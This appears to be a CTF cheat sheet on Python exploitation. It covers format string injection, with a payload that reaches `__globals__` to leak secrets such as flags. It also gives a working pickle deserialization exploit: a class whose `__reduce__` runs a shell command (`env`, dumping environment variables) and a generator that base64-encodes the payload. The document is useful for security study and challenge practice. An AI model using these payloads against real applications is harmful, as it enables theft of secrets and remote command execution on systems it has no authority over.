# Python

## Format string injection

Format string injection usually occurs when using `.format()`.

Example:
```py
a = input()
vuln = f'{{{a}}}'.format(random_string='asdf')
```

> `f'{{{a}}}'` resolves to `'{asdf}'`, input being `'asdf'`, which is passed to `'{asdf}'.format()`

> Instead of a single key, a dictionary can also be passed into `.format(**dict)`

The exploit is similar to SSTI RCE, but in this case, we don't have RCE as we cannot execute anything. Rather, we only can leak sensitive secrets (like flags)

1. Get access to a `__globals__` through the dict passed in 
	* `<key>.__init__.__globals__`
2. Access any global variable through `__globals__[name]`

> Note: if the application passes in additional attributes (like `f'{{{a}.code}}.format(**dict)`) that does not exist 
> in a string, you can escape {} and access another "proper" item that has the desired attribute

Payload:

`{item.__init__.__globals__[flag]} {item`

## Pickle unserialize

The pickle module is vulnerable to unsafe deserialization of Python objects.

Exploit:

```py
DEFAULT_COMMAND = ['env']

import pickle
import base64
import requests

#COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    ''' __reduce__ can return either a string or a tuple. If it returns a string, then it should be the name of a global variable. If it returns a tuple, it should be in the following syntax: callable, (args), *object's state (will be passed to __setstate__(), *iterator of items (for list subclasses), *iterator of key-value pairs (for dict subclasses or if the class implements __setitem__()), *(obj, state) to set state of class (overriding __setstate__() if implemented)

    The one we are interested in for RCE is callable, (args)

    This has been implemented below.
    '''

    def __reduce__(self):
        import subprocess
        #import os
        return subprocess.check_output, (DEFAULT_COMMAND,)

def gen_payload():
    payload = bytes.decode(base64.b64encode(pickle.dumps(PickleRce())), 'utf-8')
    return payload

print(gen_payload())
```

Instead of `subprocess.check_output`, we can also use `os.popen().read()`, but note that on Windows, there is an issue serializing the os module which becomes "nt" module for some reason.
